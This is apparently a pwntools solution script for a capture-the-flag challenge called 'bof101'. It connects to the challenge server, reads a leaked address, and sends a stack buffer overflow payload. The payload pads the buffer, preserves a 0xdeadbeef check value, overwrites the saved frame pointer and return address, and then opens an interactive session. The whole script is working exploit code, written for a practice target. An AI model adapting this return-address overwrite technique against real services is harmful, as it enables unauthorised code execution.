from pwn import *

"""
rbp-0x90 > input
rbp-0x4 > 0xdeadbeef
"""
r = remote("bof101.sstf.site", 1337)

flag = int(r.recvline()[-15:-1], 16)
print(r.recvline())

pay = b"A" * (0x90 - 0x4)   # stuff
pay += p32(0xdeadbeef)   # check
pay += b"A" * 8     # sfp
pay += p64(flag)


r.sendline(pay)
r.interactive()
